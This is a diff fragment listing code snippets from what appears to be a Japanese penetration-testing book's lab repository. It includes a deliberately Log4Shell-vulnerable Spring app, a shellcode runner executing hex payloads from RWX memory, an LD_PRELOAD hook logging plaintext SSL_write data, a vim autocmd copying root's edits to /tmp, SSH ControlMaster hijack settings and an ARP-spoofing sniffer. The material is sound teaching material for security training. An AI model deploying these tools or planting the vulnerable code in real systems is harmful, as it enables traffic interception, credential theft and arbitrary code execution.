+    "code": "# Forking https://github.com/christophetd/log4shell-vulnerable-app\nFROM gradle:7.3.1-jdk17 AS builder\nCOPY --chown=gradle:gradle log4j/ /home/gradle/src\nWORKDIR /home/gradle/src\nRUN gradle bootJar --no-daemon\n\n\n"
+  },
+  {
+    "step": 75,
+    "path": "containers/log4j/build.gradle",
+    "start": 1,
+    "end": 14,
+    "code": "plugins {\n\tid 'org.springframework.boot' version '2.6.1'\n\tid 'io.spring.dependency-management' version '1.0.11.RELEASE'\n\tid 'java'\n}\n\ngroup = 'fr.christophetd.log4shell'\nversion = '0.0.1-SNAPSHOT'\nsourceCompatibility = '1.8'\n\nrepositories {\n\tmavenCentral()\n}\n\n"
+  },
+  {
+    "step": 76,
+    "path": "containers/log4j/settings.gradle",
+    "start": 1,
+    "end": 1,
+    "code": "rootProject.name = 'log4shell-vulnerable-app'\n"
+  },
+  {
+    "step": 77,
+    "path": "containers/log4j/src/main/java/fr/christophetd/log4shell/vulnerableapp/VulnerableAppApplication.java",
+    "start": 1,
+    "end": 13,
+    "code": "package fr.christophetd.log4shell.vulnerableapp;\n\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\n\n@SpringBootApplication\npublic class VulnerableAppApplication {\n\n\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(VulnerableAppApplication.class, args);\n\t}\n\n}\n"
+  },
+  {
+    "step": 78,
+    "path": "containers/log4j/src/main/java/fr/christophetd/log4shell/vulnerableapp/MainController.java",
+    "start": 1,
+    "end": 10,
+    "code": "package fr.christophetd.log4shell.vulnerableapp;\n\n\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.RequestHeader;\nimport org.springframework.web.bind.annotation.RestController;\n\nimport org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\n\n"
+  },
+  {
+    "step": 79,
+    "path": "containers/log4j/src/main/java/fr/christophetd/log4shell/vulnerableapp/MainController.java",
+    "start": 11,
+    "end": 22,
+    "code": "@RestController\npublic class MainController {\n\n    private static final Logger logger = LogManager.getLogger(\"HelloWorld\");\n\n    @GetMapping(\"/\")\n    public String index(@RequestHeader(\"X-Api-Version\") String apiVersion) {\n        logger.info(\"Received a request for API version \" + apiVersion);\n        return \"Hello, world!\";\n    }\n\n}"
+  },
+  {
+    "step": 80,
+    "path": "containers/log4j/build.gradle",
+    "start": 15,
+    "end": 25,
+    "code": "dependencies {\n\timplementation('org.springframework.boot:spring-boot-starter-web') {\n\t\texclude group: 'org.springframework.boot', module: 'spring-boot-starter-logging'\n\t}\n\timplementation 'org.springframework.boot:spring-boot-starter-log4j2:2.6.1'\n\ttestImplementation 'org.springframework.boot:spring-boot-starter-test'\n}\n\ntest {\n\tuseJUnitPlatform()\n}\n"
+  },
+  {
+    "step": 81,
+    "path": "containers/log4j/Dockerfile",
+    "start": 8,
+    "end": 11,
+    "code": "FROM openjdk:8u181-jdk-alpine\nRUN mkdir /app\nCOPY --from=builder /home/gradle/src/build/libs/*.jar /app/spring-boot-application.jar\nCMD [\"java\", \"-jar\", \"/app/spring-boot-application.jar\"]\n"
+  },
+  {
+    "step": 82,
+    "path": "code/chapter05/shellcode-runner.go",
+    "start": 1,
+    "end": 10,
+    "code": "//go:build linux\n\npackage main\n\n/*\n#include <stdio.h>\n#include <sys/mman.h>\n#include <string.h>\n#include <unistd.h>\n\n"
+  },
+  {
+    "step": 83,
+    "path": "code/chapter05/shellcode-runner.go",
+    "start": 11,
+    "end": 24,
+    "code": "void call(char *shellcode, size_t length) {\n        if(fork()) {\n                return;\n        }\n        unsigned char *memory;\n        memory = (unsigned char *) mmap(0, length, \\\n                PROT_READ|PROT_WRITE|PROT_EXEC, \\\n                MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);\n        if(memory == MAP_FAILED) {\n                perror(\"mmap\");\n                return;\n        }\n        memcpy(memory, shellcode, length);\n        ( *(void(*) ()) memory)();\n"
+  },
+  {
+    "step": 84,
+    "path": "code/chapter05/shellcode-runner.go",
+    "start": 25,
+    "end": 26,
+    "code": "}\n*/\n"
+  },
+  {
+    "step": 85,
+    "path": "code/chapter06/libsniffer.c",
+    "start": 1,
+    "end": 12,
+    "code": "#include <dlfcn.h>\n#include <stdio.h>\n#include <openssl/ssl.h>\n\nint SSL_write(SSL *ssl, const void *buf, int num) {\n  int (*ssl_write)(SSL *ssl, const void *buf, int num);\n  ssl_write = dlsym(RTLD_NEXT, \"SSL_write\");\n  FILE *logfile = fopen(\"/tmp/ssl_hook_log\", \"a+\");\n  fprintf(logfile, \"%s\\n\", (char *)buf);\n  fclose(logfile);\n  return ssl_write(ssl, buf, num);\n}"
+  },
+  {
+    "step": 86,
+    "path": "code/chapter05/shellcode-runner.go",
+    "start": 27,
+    "end": 39,
+    "code": "import \"C\"\nimport (\n        \"encoding/hex\"\n        \"unsafe\"\n)\n\nfunc main() {\n        shellCodeStr := \"16進数文字列のシェルコードを入力\"\n        shellCodeBin, err := hex.DecodeString(shellCodeStr)\n        if err != nil {\n                return\n        }\n\n"
+  },
+  {
+    "step": 87,
+    "path": "code/chapter05/shellcode-runner.go",
+    "start": 40,
+    "end": 46,
+    "code": "        run(shellCodeBin)\n}\n\nfunc run(shellCodeBin []byte) {\n        C.call((*C.char)(unsafe.Pointer(&shellCodeBin[0])),\n                (C.size_t)(len(shellCodeBin)))\n}"
+  },
+  {
+    "step": 88,
+    "path": "code/chapter06/settings.vim",
+    "start": 1,
+    "end": 3,
+    "code": ":if $USER == \"root\"\n:autocmd BufWritePost * :silent :w! >> /tmp/log.txt\n:endif"
+  },
+  {
+    "step": 89,
+    "path": "code/chapter06/config",
+    "start": 1,
+    "end": 4,
+    "code": "Host *\n  ControlPath ~/.ssh/%r@%h:%p\n  ControlMaster auto\n  ControlPersist 10m"
+  },
+  {
+    "step": 90,
+    "path": "containers/pentester/code/chapter02/sniff-icmp-by-arp-spoofing.py",
+    "start": 1,
+    "end": 11,
+    "code": "#!/usr/bin/python3\n# coding: UTF-8\n\nimport argparse\nimport sys\nimport time\n\nfrom multiprocessing import Process\nfrom scapy.all import Ether, ARP, send, sniff, srp1\n\n\n"
+  },
+  {
+    "step": 91,
+    "path": "containers/pentester/code/chapter02/sniff-icmp-by-arp-spoofing.py",
+    "start": 12,
+    "end": 25,
+    "code": "def enable_ip_forward():\n    ip_forward_path = '/proc/sys/net/ipv4/ip_forward'\n    with open(ip_forward_path, 'w') as f:\n        # sudo sysctl net.ipv4.ip_forward=1相当の処理\n        f.write('1')\n\ndef get_mac_address(target_ip):\n    response = srp1(Ether(dst='ff:ff:ff:ff:ff:ff')/\n                    ARP(pdst=target_ip, op='who-has'),\n                    timeout=3, verbose=0)\n    if response:\n        return response.src\n    return None\n        \n"
+  },
+  {
+    "step": 92,
+    "path": "containers/pentester/code/chapter02/sniff-icmp-by-arp-spoofing.py",
+    "start": 26,
+    "end": 32,
+    "code": "def spoof(target_ip, destination_ip):\n    target_mac = get_mac_address(target_ip)\n    # デフォルトでhwsrcには送信元のMACアドレスが入るので未指定\n    arp_response = ARP(pdst=target_ip, hwdst=target_mac,\n                       psrc=destination_ip, op='is-at')\n    send(arp_response, verbose=0)\n\n"
+  },
+  {
+    "step": 93,
+    "path": "containers/pentester/code/chapter02/sniff-icmp-by-arp-spoofing.py",
+    "start": 33,
+    "end": 42,
+    "code": "def restore(target_ip, destination_ip):\n    target_mac = get_mac_address(target_ip)\n    destination_mac = get_mac_address(destination_ip)\n    # 正しい送信元IPアドレスと送信元MACアドレスを指定\n    arp_response = ARP(pdst=target_ip, hwdst=target_mac, \n                       psrc=destination_ip, hwsrc=destination_mac, \n                       op='is-at')\n    send(arp_response, count=5, verbose=0)\n\n# sniff関数の引数に指定するコールバック関数\n"
+  },
+  {
+    "step": 94,
+    "path": "containers/pentester/code/chapter02/sniff-icmp-by-arp-spoofing.py",
+    "start": 43,
+    "end": 54,
+    "code": "def print_packet(packet):\n    packet.show()\n\ndef sniff_icmp():\n    sniff(filter='icmp', prn=print_packet)\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(\n        description='Sniffing ICMP by ARP spoofing')\n    parser.add_argument('target', help='Target IP Address')\n    parser.add_argument('destination', help='Destination IP Address')\n\n"
+  },
+  {
+    "step": 95,
+    "path": "containers/pentester/code/chapter02/sniff-icmp-by-arp-spoofing.py",
+    "start": 55,
+    "end": 68,
+    "code": "    args = parser.parse_args()\n    target = args.target\n    destination = args.destination\n    enable_ip_forward()\n    try:\n        sniff_process = Process(target=sniff_icmp)\n        sniff_process.start()\n        print('Start sniffing...')\n        print('Start ARP spoofing...')\n        while True:\n            spoof(target, destination)\n            spoof(destination, target)\n            time.sleep(2)\n    except KeyboardInterrupt:\n"
+  },
+  {
+    "step": 96,
+    "path": "containers/pentester/code/chapter02/sniff-icmp-by-arp-spoofing.py",
+    "start": 69,
+    "end": 71,
+    "code": "        print('Restoring the network...')\n        restore(target, destination)\n        restore(destination, target)\n"
+  },
+  {
+    "step": 97,
+    "path": "code/restart-all-containers.sh",
+    "start": 1,
+    "end": 3,
+    "code": "#!/bin/sh\n\ndocker start pentest-book-bind pentest-book-nginx pentest-book-pentester pentest-book-postgres pentest-book-ssh pentest-book-log4j"
+  },
+  {
+    "step": 98,
+    "path": "code/stop-all-containers.sh",
+    "start": 1,
+    "end": 3,
+    "code": "#!/bin/sh\n\ndocker stop pentest-book-bind pentest-book-nginx pentest-book-pentester pentest-book-postgres pentest-book-ssh pentest-book-log4j"
+  },
+  {
+    "step": 99,
+    "path": "code/remove-all-images-and-containers.sh",
+    "start": 1,
+    "end": 4,
+    "code": "#!/bin/sh\n\ndocker rm pentest-book-bind pentest-book-nginx pentest-book-pentester pentest-book-postgres pentest-book-ssh pentest-book-log4j\ndocker rmi containers-bind containers-nginx containers-pentester containers-postgres containers-ssh containers-log4j"
+  },
+  {
+    "step": 100,
+    "path": "code/exec-pentester-bash.ps1",
+    "start": 1,
+    "end": 3,
+    "code": "#/usr/bin/env pwsh\n\ndocker exec -it pentest-book-pentester /bin/bash"
+  },
+  {
+    "step": 101,
+    "path": "code/restart-all-containers.ps1",
+    "start": 1,
+    "end": 3,
+    "code": "#/usr/bin/env pwsh\n\ndocker start pentest-book-bind pentest-book-nginx pentest-book-pentester pentest-book-postgres pentest-book-ssh pentest-book-log4j"
+  },
+  {
+    "step": 102,
+    "path": "code/stop-all-containers.ps1",
+    "start": 1,
+    "end": 3,
+    "code": "#/usr/bin/env pwsh\n\ndocker stop pentest-book-bind pentest-book-nginx pentest-book-pentester pentest-book-postgres pentest-book-ssh pentest-book-log4j"
+  },
+  {
+    "step": 103,
+    "path": "code/remove-all-images-and-containers.ps1",
+    "start": 1,
+    "end": 4,
+    "code": "#/usr/bin/env pwsh\n\ndocker rm pentest-book-bind pentest-book-nginx pentest-book-pentester pentest-book-postgres pentest-book-ssh pentest-book-log4j\ndocker rmi containers-bind containers-nginx containers-pentester containers-postgres containers-ssh containers-log4j"
+  },
+  {
+    "step": 104,
+    "path": ".github/workflows/typos.yml",
+    "start": 1,
+    "end": 8,
+    "code": "name: typos\n\non:\n  push:\n    branches: [ main ]\n  pull_request:\n    branches: [ main ]\n\n"
+  },
+  {
+    "step": 105,
+    "path": ".github/workflows/typos.yml",
+    "start": 9,
+    "end": 18,
+    "code": "jobs:\n  run:\n    name: Spell Check with Typos\n    runs-on: ubuntu-latest\n    steps:\n    - name: Checkout Actions Repository\n      uses: actions/checkout@v2\n\n    - name: Check spelling of files in repository\n      uses: crate-ci/typos@master\n"
+  },
+  {
+    "step": 106,
+    "path": "_typos.toml",
+    "start": 1,
+    "end": 7,
+    "code": "[type.root]\nextend-glob = ['*.root']\ncheck-file = false\n\n[type.nessus]\nextend-glob = ['*.nessus']\ncheck-file = false"
+  },
+  {
+    "step": 107,
+    "path": "containers/log4j/gradle/wrapper/gradle-wrapper.properties",
+    "start": 1,
+    "end": 5,
+    "code": "distributionBase=GRADLE_USER_HOME\ndistributionPath=wrapper/dists\ndistributionUrl=https\\://services.gradle.org/distributions/gradle-7.3.1-bin.zip\nzipStoreBase=GRADLE_USER_HOME\nzipStorePath=wrapper/dists\n"
+  }
+]
